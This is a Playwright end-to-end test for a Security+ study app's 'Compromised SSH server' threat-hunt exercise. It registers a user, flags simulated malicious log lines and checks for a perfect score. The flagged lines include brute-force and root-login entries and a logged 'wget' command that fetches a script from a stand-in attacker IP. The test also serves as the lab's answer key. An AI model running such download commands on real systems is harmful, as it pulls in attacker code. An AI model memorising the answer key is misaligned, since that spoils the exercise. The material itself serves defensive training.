import { expect, test } from "@playwright/test";
import { E2E_PASSWORD, confirmE2eEmail, e2eEmail } from "./helpers";

/**
 * Threat Hunt PBQ: register -> onboard -> PBQ lab -> open the threat hunt,
 * flag the real malicious lines, identify the attack, and confirm the
 * per-line reveal grades it 100%. Also confirms it opens with NO anxiety
 * confirm-dialog (the whole point of the redesign).
 */
test("threat hunt: flag evidence, identify attack, perfect score", async ({
  page,
}) => {
  const email = e2eEmail("threathunt");

  await page.goto("/register");
  await page.fill("#displayName", "E2E Hunt");
  await page.fill("#email", email);
  await page.fill("#password", E2E_PASSWORD);
  await page.click('button[type="submit"]');
  await page.waitForURL("**/verify");
  await confirmE2eEmail(email);
  await page.goto("/login");
  await page.fill("#email", email);
  await page.fill("#password", E2E_PASSWORD);
  await page.click('button[type="submit"]');

  await page.waitForURL("**/onboarding");
  await page.getByRole("radio", { name: /Security\+/ }).click();
  await page.getByRole("button", { name: "Start studying" }).click();
  await page.waitForURL("**/dashboard");

  // Into the PBQ lab.
  await page.getByRole("link", { name: "PBQ lab" }).first().click();
  await page.waitForURL("**/pbq");

  // The threat hunt is a hands-on scenario (Exam Simulations tab, default).
  await page.getByRole("button", { name: /Compromised SSH server/ }).click();
  await expect(
    page.getByRole("heading", { name: "Compromised SSH server" })
  ).toBeVisible();

  // Flag exactly the malicious lines. They're the ones whose text contains
  // these fragments (the failed-login burst, the successful root login, the
  // payload wget, and the attacker disconnect) — all from 203.0.113.77.
  const maliciousFragments = [
    "Failed password for root from 203.0.113.77 port 40122",
    "Failed password for root from 203.0.113.77 port 40124",
    "Failed password for root from 203.0.113.77 port 40126",
    "Failed password for admin from 203.0.113.77 port 40130",
    "Failed password for root from 203.0.113.77 port 40140",
    "Accepted password for root from 203.0.113.77 port 40170",
    "COMMAND=/usr/bin/wget http://203.0.113.77/x.sh",
    "Received disconnect from 203.0.113.77 port 40170",
  ];
  for (const frag of maliciousFragments) {
    await page.getByRole("button", { name: new RegExp(escapeRe(frag)) }).click();
  }
  await expect(page.getByText(`${maliciousFragments.length} flagged`)).toBeVisible();

  // Identify the attack.
  await page
    .getByRole("radio", { name: /brute-force attack that succeeded/i })
    .click();

  // Analyze — note: a plain button, no "are you sure" confirm dialog.
  await page.getByRole("button", { name: "Analyze", exact: true }).click();

  // Perfect hunt.
  await expect(page.getByText("100%")).toBeVisible();
  await expect(page.getByText("Threat identified")).toBeVisible();
  await expect(
    page.getByRole("heading", { name: "What happened" })
  ).toBeVisible();
});

function escapeRe(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}
